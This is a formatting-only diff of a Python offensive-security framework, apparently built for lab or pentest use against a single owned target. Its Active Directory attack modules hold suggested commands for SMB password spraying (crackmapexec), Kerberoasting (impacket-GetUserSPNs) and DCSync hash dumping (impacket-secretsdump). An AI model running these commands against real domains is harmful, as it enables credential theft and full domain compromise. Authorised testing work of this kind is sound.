@@ -35,13 +35,17 @@ class CredentialSpray(AttackModule):
             evidence=[f"credential spray planned against {ctx.target_ip}"],
             references=["https://www.thehacker.recipes/a-d/movement/credentials/spraying"],
             suggested_command=f"crackmapexec smb {ctx.target_ip} -u users.txt -p passwords.txt --continue-on-success",
-            prerequisites=["lockout policy checked (lockoutThreshold via ADLDAPEnum)", "user list from ADLDAPEnum/SMBNullSession"],
+            prerequisites=[
+                "lockout policy checked (lockoutThreshold via ADLDAPEnum)",
+                "user list from ADLDAPEnum/SMBNullSession",
+            ],
         )
 
 
 # ---------------------------------------------------------------------------
 # Privilege Escalation Modules
 # ---------------------------------------------------------------------------
+
 
 class PasswordSpray(AttackModule):
     name = "PasswordSpray"
@@ -150,6 +154,7 @@ else:
 print("\\n[!] For larger sprays, use crackmapexec or o365spray for O365/Azure targets.")
 '''
 
+
 class HashCrack(AttackModule):
     name = "HashCrack"
     description = "Wrapper around hashcat/john with rule-based mutations for captured hashes"
@@ -202,6 +207,7 @@ class HashCrack(AttackModule):
 # lateral_exec) -- they are recipe/orchestration modules, not re-implementations.
 # Every generated script connects ONLY to ctx.target_ip (the single owned
 # target) or operator-box callback hosts expressed as parameters.
+
 
 class ASREPRoast(AttackModule):
     name = "ASREPRoast"
@@ -278,8 +284,7 @@ class Kerberoasting(AttackModule):
                 "https://hashcat.net/wiki/doku.php?id=example_hashes (mode 13100)",
             ],
             suggested_command=(
-                f"impacket-GetUserSPNs -request -dc-ip {ctx.target_ip} "
-                f"DOMAIN/user:password -format hashcat"
+                f"impacket-GetUserSPNs -request -dc-ip {ctx.target_ip} DOMAIN/user:password -format hashcat"
             ),
             workflow=[
                 f"1. Call kerberoast(target_ip='{ctx.target_ip}') to request TGS tickets for all SPN-backed service accounts from the domain controller.",
@@ -325,8 +330,7 @@ class DCSyncAttack(AttackModule):
                 "https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr",
             ],
             suggested_command=(
-                f"impacket-secretsdump DOMAIN/user:password@{ctx.target_ip} "
-                f"-just-dc -outputfile ntds_hashes"
+                f"impacket-secretsdump DOMAIN/user:password@{ctx.target_ip} -just-dc -outputfile ntds_hashes"
             ),
             privilege_level="admin",
             workflow=[
@@ -547,4 +551,3 @@ def main() -> None:
 if __name__ == "__main__":
     main()
 '''
-
